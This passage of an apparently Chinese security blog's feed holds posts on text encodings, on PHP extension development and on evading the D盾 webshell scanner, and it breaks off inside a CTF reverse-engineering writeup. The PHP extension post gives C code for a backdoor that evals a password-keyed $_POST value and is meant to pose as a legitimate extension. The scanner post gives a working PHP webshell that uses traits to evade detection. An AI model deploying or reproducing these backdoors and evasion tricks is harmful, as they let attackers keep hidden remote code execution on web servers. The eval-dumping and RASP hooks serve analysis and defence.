class="built_in">printf</span>(<span class="string">"%d\n"</span>, utf8_to_codepoint(<span class="string">"五"</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h2><p>说实话, 我觉得 UTF-16 已经可以被扔进历史的垃圾桶, 然而 <code>Windows</code> 还依然使用 233.<br>他本身是为了保证固定长度而设计的, 因为两个字节 256*256, 可以表示 65536 种字符,<br>在以前 unicode 收录字符比较少的情况下是完全够的, 这样每个字符都保存为两个字节长,<br>可以节省运算, 虽然浪费了挺多的空间, 但是确实很方便.  </p><p>然而现在上面的网站上看到,  unicode 收录的字符早已超过了 65536 个, 也就意味着码点超过了 <code>0xFFFF</code>.<br>这里以 <code>𐎠</code> 这个字符为例  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"啊"</span>.encode(<span class="string">'utf-16be'</span>)</span><br><span class="line"><span class="string">b'UJ'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"𐎠"</span>.encode(<span class="string">'utf-16be'</span>)</span><br><span class="line"><span class="string">b'\xd8\x00\xdf\xa0'</span></span><br></pre></td></tr></table></figure><p>可以看到, 实际上保存这个字符用了 4 个字节. 历史的发展使得 UTF-16 唯一的好处已经荡然无存.<br>而且为了保存大端小端的额外信息, 还用了 <code>BOM</code> 这种丑陋的设计, 希望 <code>Windows</code> 也能早点淘汰掉 UTF-16 把 233</p><h2 id="GBK"><a href="#GBK" class="headerlink" title="GBK"></a>GBK</h2><p>这个是我国自创的编码标准, 优点非常明显, 节省空间, 相当于缩小版的 UTF-8 (当然用的码点表和具体实现跟 unicode 不同),<br>因为它只需要表达 ASCII + 汉字的字符空间就够了. 当然缺点也非常明显, 不能表达 ASCII + 汉字之外的字符, 也就注定只能在中国使用,<br>无法国际化, 而且实际上很多国家都有一套自创字符集, 这更促进了 unicode 的诞生. </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前对 UTF-8, UTF-16, unicode, GBK, ASCII 之类的都是一知半解, 其实深入之后了解这些并不困难.  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="misc" scheme="https://rmb122.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PHP 扩展学习</title>
    <link href="https://rmb122.com/2019/07/31/PHP-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rmb122.com/2019/07/31/PHP-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-07-31T09:11:21.000Z</published>
    <updated>2019-08-01T08:30:22.844Z</updated>
    
    <content type="html"><![CDATA[<p>PHP 类似于 python 也是运行在解释器上的, PHP 的叫 zend, python 的叫 cpython,<br>这些都是官方实现, 像 python 也有 jython, pypy 啥的, 用其他语言写的解释器.  </p><a id="more"></a><p>两者有个非常相似的地方, 或者说动态语言都非常相似的地方, 是都存在一个万能基类,<br>python 的叫 <code>PyObject</code>, php 的叫 <code>zval</code>. python 的因为没看过, 不太了解, 在 PHP 中,<br>是靠 union 结构体来实现的  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zend_value &#123;</span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="keyword">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="keyword">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> w1;</span><br><span class="line"><span class="keyword">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure><p>因为是 union, 其实这大小在 amd64 上其实就是 8 字节, C 语言这神奇的特性其实在某种形式上做到了多态.<br>一切对象都可以用 zval 来表达.</p><p>而 PHP 扩展, 就是可以直接干预这个 zend 虚拟机本身的执行, 比如加几个函数, 替换原来的函数之类的. zend 虚拟机会在启动时执行一系列函数,<br>加载扩展里面定义的各种函数, PHP_MINIT, PHP_RINIT, PHP_FUNCTION 等等.  </p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/php/php-src.git -b php-7.3.7</span><br><span class="line"><span class="built_in">cd</span> php-7.3.7</span><br><span class="line">./ext/ext_skel.php --ext extname</span><br><span class="line">./configure</span><br></pre></td></tr></table></figure><p>就能自动生成一套模版, 毕竟是开源产品, 对开发者非常友好,<br>CLion 可以用以下 CMakelist 添加高亮, 方便开发.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.3)</span><br><span class="line">project(backdoor)</span><br><span class="line"></span><br><span class="line">add_custom_target(makefile COMMAND make WORKING_DIRECTORY $&#123;PROJECT_SOURCE_DIR&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmake_minimum_required(VERSION 3.6)</span><br><span class="line">project(backdoor C)</span><br><span class="line"></span><br><span class="line">message(&quot;Begin cmaking of PHP extension ...&quot;)</span><br><span class="line"></span><br><span class="line"># -std&#x3D;gnu99</span><br><span class="line">set(CMAKE_C_STANDARD 99)</span><br><span class="line">set(CMAKE_C_FLAGS &quot;$&#123;CMAKE_C_FLAGS&#125; -ggdb -O0 -Wall -std&#x3D;gnu99 -fvisibility&#x3D;hidden&quot;)</span><br><span class="line">set(ENV&#123;PROJECT_ROOT&#125; &quot;$&#123;CMAKE_HOME_DIRECTORY&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># NOTE: This CMake file is just for syntax highlighting in CLion, 替换成你自己的路径</span><br><span class="line">include_directories(</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F; </span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;main</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;Zend</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;TSRM</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;ext</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;ext&#x2F;standard</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;sapi</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">set(SOURCE_FILES</span><br><span class="line">        backdoor.c</span><br><span class="line">        php_backdoor.h</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">if(EXISTS &quot;$ENV&#123;PROJECT_ROOT&#125;&#x2F;config.h&quot;)</span><br><span class="line">    set(SOURCE_FILES &quot;$&#123;SOURCE_FILES&#125;;config.h&quot;)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">add_library(backdoor $&#123;SOURCE_FILES&#125;)</span><br><span class="line"></span><br><span class="line">message(&quot;End cmaking of PHP extension ...&quot;)</span><br></pre></td></tr></table></figure><p>接下来学习一下扩展的几种利用方式  </p><h2 id="替换-zend-compile-string"><a href="#替换-zend-compile-string" class="headerlink" title="替换 zend_compile_string"></a>替换 zend_compile_string</h2><p>这在 <code>php-src/Zend/zend_compile.h:722</code> 被定义, <code>php-src/Zend/zend.c:835</code> 被实现,  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_compile_string = compile_string;</span><br></pre></td></tr></table></figure><p>定义的时候就是定义为函数指针, 可以说是这么故意设计的, 就是为了方便替换.<br>这个函数就是 zend engine 解析代码到 op code 的函数, 正如其名, 起到编译器的作用.  </p><p>而 eval, include 等等, 都会调用这个函数, 因为都需要编译到 op code 才能真正被执行.<br>所以我们就能替换这个函数到自己定义的函数, 比如在 <code>compile_string</code> 的同时, 把<br>它输入的字符串, 也就是代码打印出来, 就能在某些时候起到解密的作用.<br>因为某些加密就是单纯各种变换最后 eval 一下而已, 本质原因是 PHP 本身就很灵活, 各种反射, 还有 $$var 这种东西,<br>如果替换变量名/函数名, 大概率会导致代码不可用. 所以很多加密其实通过替换 zend_compile_string 就可以完全解密.  </p><p>了解了原理, 那么写起来不是很困难, 就是将 source_string 打印出来即可, 放在 <code>RINIT</code> 中, 每次请求都会重新替换一次.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">zend_op_array *<span class="title">dump_while_eval</span><span class="params">(zval *source_string, <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    php_printf(<span class="string">"\n\nfilename: \n"</span>);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, filename);</span><br><span class="line">    php_printf(<span class="string">"\n\neval_code: \n"</span>);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, Z_STRVAL_P(source_string));</span><br><span class="line">    php_printf(<span class="string">"\n\nresult: \n"</span>);</span><br><span class="line">    <span class="keyword">return</span> compile_string(source_string, filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// hook eval</span></span><br><span class="line">    zend_compile_string = dump_while_eval;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候 <code>make &amp;&amp; make install</code> 一下, 在 ini 中开启扩展, php -a 一下, 就可以发现已经成功了, 因为 php -a 说到底也得<br>经过编译这个过程.</p><h2 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h2><p>这个其实我感觉还是比较隐蔽的, 可以把原来的比如 <code>;extension=tidy</code>, <code>tidy.so</code>, 换成自己的, 然后开启,<br>我估计很少有人会注意到, 查杀的话得检查 HASH 之类的, 说实话挺麻烦的, 毕竟每次更新这个 hash 都会变.<br>而留后门的话一般都是在 RINIT 中添加, 每次都检查 <code>$_POST</code> 上有没有自己留下的后门密码, 有的话执行一下,<br>相当于把 webshell 藏到扩展里面了.<br>当然也可以自己给添加一个 my_eval 函数之类的, D 盾 100% 查不出来 233  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(my_backdoor_eval) &#123;</span><br><span class="line">    <span class="keyword">char</span>* tmp;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        Z_PARAM_STRING(tmp, len)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    zend_eval_string(tmp, <span class="literal">NULL</span>, (<span class="keyword">char</span> *)<span class="string">""</span> TSRMLS_CC);</span><br><span class="line">    RETURN_TRUE</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">char</span> *password = <span class="string">"execute"</span>;</span><br><span class="line"></span><br><span class="line">    zval * arr, *code = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (arr = zend_hash_str_find(&amp;EG(symbol_table), <span class="string">"_POST"</span>, <span class="keyword">sizeof</span>(<span class="string">"_POST"</span>) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Z_TYPE_P(arr) == IS_ARRAY &amp;&amp;</span><br><span class="line">            (code = zend_hash_str_find(Z_ARRVAL_P(arr), password, <span class="built_in">strlen</span>(password)))) &#123;</span><br><span class="line">            zend_eval_string(Z_STRVAL_P(code), <span class="literal">NULL</span>, <span class="string">""</span> TSRMLS_CC);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_backdoor_eval, <span class="number">0</span>)</span><br><span class="line">                ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; backdoor_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry backdoor_functions[] = &#123;</span><br><span class="line">PHP_FE(my_backdoor_eval,       arginfo_my_backdoor_eval)</span><br><span class="line">PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure><h2 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h2><p>这个其实我感觉前途应该是最大的, 可以参考 <a href="https://github.com/laruence/taint" target="_blank" rel="noopener">https://github.com/laruence/taint</a>,<br>毕竟是 PHP 的开发者, 真的 tql.  </p><p>我参考之前的 php_apd, 通过替换函数表里面的函数也实现了一个, 当然肯定没有鸟哥直接劫持 op code 的操作牛逼,<br>劫持 op code 的执行可以拦截 eval, echo 之类的关键字, 而劫持函数表只能劫持函数, 相对更局限一些.<br>而且我的实现感觉 100% 有内存泄露 (逃</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">char</span>* internal_func_name = <span class="string">"system"</span>; <span class="comment">// 内置函数名</span></span><br><span class="line">    <span class="keyword">char</span>* new_internal_func_name = <span class="string">"__internal__"</span>; <span class="comment">// 新内置函数名</span></span><br><span class="line"></span><br><span class="line">    zend_internal_function *internal_func = zend_hash_str_find_ptr(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name));</span><br><span class="line">    zend_internal_function *copy_internal_func = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(zend_internal_function));</span><br><span class="line">    <span class="built_in">memcpy</span>(copy_internal_func, internal_func, <span class="keyword">sizeof</span>(zend_internal_function));</span><br><span class="line">    </span><br><span class="line">    zend_hash_str_add_ptr(EG(function_table), new_internal_func_name, <span class="built_in">strlen</span>(new_internal_func_name), copy_internal_func);</span><br><span class="line">    zend_hash_str_del(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *replace_code = <span class="string">"function __temp__($a) &#123;var_dump($a);if (preg_match('/bash/i', $a) === 0) &#123;__internal__($a);&#125; else &#123;echo $a.' is banned';&#125;&#125;;"</span>; <span class="comment">// 替换的函数代码</span></span><br><span class="line"></span><br><span class="line">    zend_eval_string(replace_code, <span class="literal">NULL</span> , <span class="string">""</span>);</span><br><span class="line">    zend_op_array *replace_func = zend_hash_str_find_ptr(EG(function_table), <span class="string">"__temp__"</span>, <span class="built_in">strlen</span>(<span class="string">"__temp__"</span>));</span><br><span class="line"></span><br><span class="line">    zend_hash_str_add_ptr(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name), replace_func);</span><br><span class="line">    *(replace_func-&gt;refcount) += <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    zend_hash_str_del(EG(function_table), <span class="string">"__temp__"</span>, <span class="built_in">strlen</span>(<span class="string">"__temp__"</span>));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PHP 类似于 python 也是运行在解释器上的, PHP 的叫 zend, python 的叫 cpython,&lt;br&gt;这些都是官方实现, 像 python 也有 jython, pypy 啥的, 用其他语言写的解释器.  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="php" scheme="https://rmb122.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>利用 PHP Trait 特性绕过 D 盾查杀</title>
    <link href="https://rmb122.com/2019/07/25/%E5%88%A9%E7%94%A8-PHP-Trait-%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87-D-%E7%9B%BE%E6%9F%A5%E6%9D%80/"/>
    <id>https://rmb122.com/2019/07/25/%E5%88%A9%E7%94%A8-PHP-Trait-%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87-D-%E7%9B%BE%E6%9F%A5%E6%9D%80/</id>
    <published>2019-07-25T07:14:14.000Z</published>
    <updated>2019-07-25T07:39:26.516Z</updated>
    
    <content type="html"><![CDATA[<p>帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了.</p><a id="more"></a><p>这个特性已经写在 Title 里面了, 具体可以参考 <a href="https://www.php.net/traits" target="_blank" rel="noopener">php.net</a> 上的介绍,<br>说人话就是覆盖方法, 于是我们就可以覆盖父类的方法, 把无害的变成有害的.  </p><p>不废话, 直接看 shell 代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> T &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dynamic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"$this-&gt;s"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dynamic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I am innocent"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;s = $_REQUEST[<span class="string">'s'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">T</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dynamic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> C();</span><br></pre></td></tr></table></figure><p>可以看到用 T 的 <code>dynamic</code> 覆盖了 B 的 <code>dynamic</code>, 导致了代码执行,<br>个人猜测是 D 盾不支持 <code>trait</code>, 没有把里面的 eval 当成代码, 直接给跳过了.  </p><p><img src="https://i.loli.net/2019/07/25/5d395c8b9e25359401.png" alt=""><br><img src="https://i.loli.net/2019/07/25/5d395c8b9b5f447606.png" alt=""><br><img src="https://i.loli.net/2019/07/25/5d395c8bbdf0329396.png" alt="">  </p><p>而且很神奇的是, 在这一段下面放一段本来过不了的, 也能过 D 盾了.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;c = $_REQUEST[<span class="string">'a'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> B();</span><br><span class="line">$d-&gt;a();</span><br></pre></td></tr></table></figure><p>感觉 D 盾内应该有好几种引擎, trait 把其中基于数据流的引擎给搞崩了? 于是也就能过了.<br>比较的谜…</p><p>最后, PHP 这种动态语言, 静态查杀的难度是真的大…<br>特别涉及类, 过 D 盾的姿势非常多, 百度随便搜搜就有一堆. 想要真正防止, 还是靠 rasp 这种技术吧.<br>hook eval, 然后检测数据流是否来自 $_POST, $_GET 等等</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="pentest" scheme="https://rmb122.com/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>CyBRICS CTF Samizdat Writeup</title>
    <link href="https://rmb122.com/2019/07/22/CyBRICS-CTF-Samizdat-Writeup/"/>
    <id>https://rmb122.com/2019/07/22/CyBRICS-CTF-Samizdat-Writeup/</id>
    <published>2019-07-22T01:56:31.000Z</published>
    <updated>2019-07-22T03:05:48.368Z</updated>
    
    <content type="html"><![CDATA[<p>这题是在比赛结束后才做出来的, 比较可惜, 但是题目本身还是比较有意思的, 所以写个 Writeup.<br>(早知道早点起床做题了</p><a id="more"></a><p>首先打开来可以下载  </p><ul><li>阅读器</li><li>guide.txt</li><li>两本加密过的书</li></ul><p>其中阅读器能解密书, 但是只能读前 100 页, 接下来自然是 IDA F5 伺候一下阅读器,  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)decrypt((<span class="keyword">unsigned</span> __int8 *)ptr, n, &amp;v11, &amp;v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="string">"Failed to decrypt book"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = decompress_book(v11, v12, &amp;v14, &amp;v13);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="string">"Failed to decompress book"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">return</span> <span 